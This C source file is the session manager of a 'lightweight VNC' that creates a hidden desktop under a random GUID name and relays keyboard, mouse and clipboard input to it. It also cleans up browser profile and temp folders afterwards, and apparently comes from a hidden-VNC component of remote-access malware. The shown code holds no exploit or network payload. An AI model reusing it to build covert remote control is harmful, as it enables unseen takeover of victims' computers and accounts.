//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// VNC project. Version 1.9.17.3
//	
// module: vnc.c
// $Revision: 194 $
// $Date: 2014-07-11 16:55:06 +0400 (Пт, 11 июл 2014) $
// description:
//	Lightweight VNC implementation.

#include "project.h"
#include <malloc.h>

#include "names.h"
#include "desktop.h"
#include "scr.h"
#include "bmp.h"
#include "system.h"
#include "cpu.h"
#include "clipbd.h"
#include "opera.h"
#include "copy.h"
#include "rt\str.h"

CRITICAL_SECTION g_VncSessionListLock = {0};
PVNC_SESSION g_VncSessionList = NULL;

VOID VncAcquireListLock( VOID )
{
	EnterCriticalSection(&g_VncSessionListLock);
}

VOID VncReleaseListLock( VOID )
{
	LeaveCriticalSection(&g_VncSessionListLock);
}

VOID VncAddSession( PVNC_SESSION pSession )
{
	EnterCriticalSection(&g_VncSessionListLock);

	pSession->Next = g_VncSessionList;
	g_VncSessionList = pSession;

	LeaveCriticalSection(&g_VncSessionListLock);
}

VOID VncRemoveSession( PVNC_SESSION pSession )
{
	PVNC_SESSION ListEntry = NULL;
	PVNC_SESSION PrevEntry = NULL;

	EnterCriticalSection(&g_VncSessionListLock);

	if ( g_VncSessionList ){
		if ( pSession == g_VncSessionList ){
			g_VncSessionList = pSession->Next;
		}else {
			ListEntry = PrevEntry = g_VncSessionList;
			while ( ListEntry ){
				if ( ListEntry == pSession ) {
					PrevEntry->Next = ListEntry->Next;
					break;
				}
				PrevEntry = ListEntry;
				ListEntry = ListEntry->Next;
			}
		}
	}
	LeaveCriticalSection(&g_VncSessionListLock);
}

PVNC_SESSION VncSessionLookup( PVNC_COMPARE_FUNC func, PVOID Context )
{
	PVNC_SESSION pSession = NULL;
	EnterCriticalSection(&g_VncSessionListLock);

	pSession = g_VncSessionList;
	while ( pSession ){
		if ( func( pSession, Context )) {
			break;
		}
		pSession = pSession->Next;
	}
	LeaveCriticalSection(&g_VncSessionListLock);
	return pSession;
}

VOID VncLockSession( PVNC_SESSION pSession )
{
	WaitForSingleObject(pSession->hLockMutex, INFINITE);
}
VOID VncUnlockSession( PVNC_SESSION pSession )
{
	ReleaseMutex(pSession->hLockMutex);
}

HWND SS_GET_FOREGROUND_WND ( PVNC_SESSION pSession )
{
	HWND hwnd;
	SS_LOCK(pSession);
	hwnd = SS_GET_DATA(pSession)->hForegroundWnd;
	SS_UNLOCK(pSession);
	return hwnd;
}

VOID SS_SET_FOREGROUND_WND ( PVNC_SESSION pSession, HWND hWnd )
{
	SS_LOCK(pSession);
	SS_GET_DATA(pSession)->hForegroundWnd = hWnd;
	SS_UNLOCK(pSession);
}

// functions cleanup all the temp directories
// dirs can be created by ff,chrome and other workarounds
VOID VncCleaupTempDirs( PVNC_SESSION pSession )
{
	LPWSTR szTemDir = NULL;
	ULONG szTemDirLength;
	WCHAR szPattern[DESKTOP_NAME_LENGTH+2];
	USES_CONVERSION;

	// cleanup tmp dir
	szTemDirLength = GetTempPathW(0,NULL);
	if ( szTemDirLength  ){
		szTemDir = hAlloc((szTemDirLength+1)*sizeof(WCHAR)); // \\+/0
		if ( szTemDir ){
			// save profile dir path
			if ( GetTempPathW(szTemDirLength+1,szTemDir) <= szTemDirLength ){

				lstrcatW(szTemDir,L"\\");

				lstrcpyW(szPattern,A2W(pSession->Desktop.Name));
				lstrcatW(szPattern,L"*");

				// do not remove high-level directory
				XRemoveDirectoryW( szTemDir, szPattern, FALSE );
			}
			hFree ( szTemDir ); 
		}
	}
	//cleanup opera profiles
	OPR_Cleanup(pSession);
}

// cleanup all session data
VOID VncCloseSession(
	IN PVNC_SESSION VncSession
	)
{
	ASSERT_VNC_SESSION(VncSession);

	// Setting status event to notify VNC session processes about session termination
	if ( VncSession->SharedSection.hStatusEvent ){
		DeskCloseWindows( &VncSession->Desktop );
		SetEvent(VncSession->SharedSection.hStatusEvent);
	}

	// stop screen update thread
	ScrStopUpdateThread( VncSession );

	// stop windows watcher
	WW_Stop( VncSession );

	// stop kbd layout switcher
	LS_Stop( VncSession );

	// remove from global list
	VncRemoveSession( VncSession );

	if (VncSession->SharedSection.Data)
	{
		// Setting status event to notify VNC session processes about session termination
		//SetEvent(VncSession->SharedSection.hStatusEvent);
		VncReleaseSharedSection(&VncSession->SharedSection);
	}

	// kill all the processes on desktop
	DeskKillAllProcesses( &VncSession->Desktop );
//	if (VncSession->Desktop.ShellInfo.hProcess)
//		TerminateProcess(VncSession->Desktop.ShellInfo.hProcess, 0);

	// cleanup temporary dirs
	VncCleaupTempDirs(VncSession);

	// release desktop
	DeskRelease( &VncSession->Desktop );

	if ( VncSession->hLockMutex ){
		CloseHandle( VncSession->hLockMutex );
	}
#if _DEBUG
	VncSession->Magic = 0;
#endif

	VncReleaseFramebuffer(VncSession->FrameBuffer);

	hFree(VncSession);
}

WINERROR 
	VncCreateSession(
		IN PRFB_SESSION RfbSession,
		OUT	PVNC_SESSION* pVncSession,
		OUT PPIXEL_FORMAT LocalPixelFormat 
		)
{
	PVNC_SESSION VncSession = NULL;
	ULONG		NameLen, NameSeed = GetTickCount();
	LPTSTR		DesktopName = NULL;
	WINERROR	Status = ERROR_UNSUCCESSFULL;

	do	// not a loop
	{
		// Generating a name for the new desktop
		if (!(DesktopName = GenGuidName(&NameSeed, NULL, NULL, TRUE)))
			break;

		NameLen = lstrlen(DesktopName);

		// Allocating VNC_SESSION structure
		if (!(VncSession = hAlloc(sizeof(VNC_SESSION) + (NameLen+1)*sizeof(TCHAR))))
			break;

		// Initializing VNC_SESSION
		memset(VncSession, 0, sizeof(VNC_SESSION));
#if _DEBUG
		VncSession->Magic = VNC_SESSION_MAGIC;
#endif
		VncSession->RfbSession = RfbSession;

		// allocate session lock
		VncSession->hLockMutex = CreateMutex(NULL,FALSE,NULL);
		if ( !VncSession->hLockMutex ){
			break;
		}

		// Creating new desktop
		if ((Status = CreateNewDesktop( VncSession, DesktopName, NameLen, LocalPixelFormat )) != NO_ERROR)
			break;

		if ((Status = VncInitSharedSection(
				VncSession->Desktop.hDesktop,
				&VncSession->SharedSection, 
				VncSession->Desktop.dwScreenBufferSize,
				TRUE
				)) != NO_ERROR)
			break;

		// link session to global list now
		// we need it before starting windows watcher
		VncAddSession(VncSession);

		// start windows watcher
		//if (!(VncSession->Desktop.dwFlags & HVNC_USE_BITBLT))
		{
			if ((Status = WW_Start( VncSession )) != NO_ERROR)
				break;
		}

		if ((Status = DeskInitailize(VncSession)) != NO_ERROR)
			break;

		// start kbd layout switcher
		LS_Start(VncSession);

		// start screen update thread
		Status = ScrStartUpdateThread(VncSession);
		if ( Status != NO_ERROR ){
			break;
		}

		*pVncSession = VncSession;
		Status = NO_ERROR;
		
	} while(FALSE);

	if (Status == ERROR_UNSUCCESSFULL)
		Status = GetLastError();

	if (DesktopName){
		hFree(DesktopName);
	}

	if (Status != NO_ERROR && (VncSession)){
		VncCloseSession(VncSession);
	}

	return(Status);
}


VOID VncReleaseFramebuffer(PVNC_FRAMEBUFFER fBuffer)
{
	PVNC_FRAMEBUFFER fNext;
	if ( fBuffer ){
		do 
		{
			fNext = fBuffer->Next;
			if (fBuffer->Buffer && fBuffer->Size){
				hFree(fBuffer->Buffer);
			}
			hFree(fBuffer);
		} while(fBuffer = fNext);
	}
}


WINERROR VncSetPixelFormat(
	IN PVNC_SESSION		pVncSession,
	IN PPIXEL_FORMAT	pPixelFormat
	)
{
	WINERROR	Status = NO_ERROR;

	DbgPrint("bpp=%i\n",pPixelFormat->BitsPerPixel);

	return(Status);
}

WINERROR VncGetFramebuffer(
	IN PVNC_SESSION		pVncSession,
	IN OUT PVNC_FRAMEBUFFER_REQUEST pVncFbRequest
	)
{
	pVncSession->Incremental = pVncFbRequest->Incremental;
	pVncSession->Rect = pVncFbRequest->Rect;
	SetEvent( pVncSession->Desktop.hScreenUpdateEvent );

	pVncFbRequest->VncBuffers = NULL;
	return NO_ERROR;
}

WINERROR	VncOnKeyEvent(
	IN PVNC_SESSION		pVncSession,
	IN PVNC_KEY_EVENT	pKeyEvent
	)
{
	WINERROR	Status = NO_ERROR;

	KbdOnKeyEvent(pVncSession,pKeyEvent->Key,pKeyEvent->DownFlag);

	return(Status);
}

WINERROR	VncOnPointerEvent(
	IN PVNC_SESSION		pVncSession,
	IN PVNC_POINTER_EVENT pPointerEvent
	)
{
	OnPointerEvent(
		pVncSession,
		pPointerEvent->ButtonMask,
		pPointerEvent->XPosition,
		pPointerEvent->YPosition
		);
	return NO_ERROR;
}

WINERROR	VncOnClientCutText(
	IN PVNC_SESSION		pVncSession,
	IN PVNC_CLIENT_CUT_TEXT pClientCutText
	)
{
	WINERROR	Status = NO_ERROR;

	ClipOnEvent(pVncSession,pClientCutText->Text,pClientCutText->Length);

	return(Status);
}

WINERROR VncStartup(VOID)
{
	WINERROR Status;

	InitializeCriticalSection(&g_VncSessionListLock);
	
	MessageBoxTimeout=(_MessageBoxTimeout)GetProcAddress(GetModuleHandle(_T("user32")),"MessageBoxTimeoutA");
	if (!MessageBoxTimeout){
		return ERROR_PROC_NOT_FOUND;
	}

	CpuInit();
	BmpInitiPainting();

	Status = ScrStartup();
	if ( Status == NO_ERROR ){
		chksum_crc32gentab();
		KeyBoardInit();
		ClipInitialize();
	}
	return(Status);
}

VOID VncCleanup(VOID)
{
	//EnableSystemSounds(FALSE);
	ScrCleanup();
	CpuRelease();
}

